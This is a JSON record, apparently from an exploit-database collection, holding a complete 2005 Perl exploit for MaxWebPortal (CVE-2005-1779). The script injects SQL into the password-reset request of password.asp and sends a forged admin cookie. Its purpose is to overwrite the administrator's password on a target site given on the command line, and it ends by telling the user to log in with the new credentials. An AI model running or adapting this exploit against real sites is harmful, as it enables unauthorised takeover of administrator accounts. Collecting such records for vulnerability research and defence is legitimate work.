{
  "id": "1010",
  "title": "Maxwebportal 1.36 - &#039;Password.asp&#039; Change Password (3)",
  "cve": "CVE-2005-1779",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#################################################################\r\n#    T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m\r\n#################################################################\r\n# EXPLOIT FOR - MAX Portal (All Versions)\r\n#\r\n#Exploit By :  A l p h a _ P r o g r a m m e r ( Sirus-v );\r\n#E-Mail : Alpha_Programmer@Yahoo.com\r\n#\r\n#This Xpl Change Admin's Pass in This Portal !!\r\n#\r\n#Discovered by: s d <irsdl@yahoo.com>\r\n#\r\n#################################################################\r\n#  Gr33tz To ==>   mh_p0rtal , Oil_karchack , Str0ke   &  AlphaST.Com\r\n#\r\n#And Iranian Hacking & Security Teams :\r\n# IHS , Shabgard , Emperor ,Crouz & Simorgh-ev\r\n#################################################################\r\nuse IO::Socket;\r\n\r\nif (@ARGV < 2)\r\n{\r\n print \"\\n==========================================\\n\";\r\n print \" \\n     -- Exploit By Alpha Programmer --\\n\\n\";\r\n print \"     Trap-Set Underground Hacking Team      \\n\\n\";\r\n print \"      Usage: Max.pl <T4rg3t> <V3rsion>\\n\\n\";\r\n print \" V3rsion :\\n\";\r\n print \" 1 ==>   Version 1.35 and 0lder\\n\";\r\n print \" 2 ==>   Version 1.36, 2.0 and Next\\n\";\r\n print \"==========================================\\n\\n\";\r\n print \"Example:\\n\\n\";\r\n print \"    Max.pl www.Site.com 1\\n\";\r\n exit();\r\n}\r\n$hell = \"foo' or M_Name='admin\";\r\nif ($ARGV[1] =~\"2\" ){$hell = \"foo%27%29+or+M_Name%3D%27admin%27+or+%28%271%27%3D%272\"};\r\n\r\n\r\nmy $host = $ARGV[0];\r\nmy $remote = IO::Socket::INET->new ( Proto => \"tcp\", PeerAddr => $host,\r\nPeerPort => \"80\" );\r\n\r\nunless ($remote) { die \"C4nn0t C0nn3ct to $host\" }\r\n\r\nprint \"C0nn3cted\\n\";\r\n\r\n$http = \"POST /password.asp?mode=reset HTTP/1.0\";\r\n$http .= \"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\\n\";\r\n$http .= \"Accept-Language: fa\\n\";\r\n$http .= \"Content-Type: application/x-www-form-urlencoded\\n\";\r\n$http .= \"Pragma: no-cache\\n\";\r\n$http .= \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)\\n\";\r\n$http .= \"Host: $host\\n\";\r\n$http .= \"Content-Length: 111\\n\";\r\n$http .= \"Proxy-Connection: Keep-Alive\\n\";\r\n$http .= \"Cookie: SSOComhide=Name=admin; SSOComUser=Cookies=&Pword=d7fae5da3d785535c12b70865519ba86&Name=admin\\n\\n\";\r\n\r\n$http .= \"pass=trapset&pass2=trapset&memId=-1&memKey=$hell&Submit=Submit\\n\\n\\n\\n\";\r\n\r\nprint \"\\n\";\r\nprint $remote $http;\r\nsleep(1);\r\nprint \"[+] Attacking ...\\n\";\r\nprint \"[+] Changing Admin's Password ...\\n\";\r\nwhile (<$remote>)\r\n{\r\n}\r\nprint \"\\nNow Go to $host and Login With :\\n\\n\";\r\nprint \"User: admin\\n\";\r\nprint \"Pass: trapset\\n\\n\";\r\nprint \"Enjoy ;)\\n\";\r\nprint \"\\n\";\r\n### EOF ###\r\n\r\n# milw0rm.com [2005-05-26]",
  "url": "https://www.exploit-db.com/exploits/1010"
}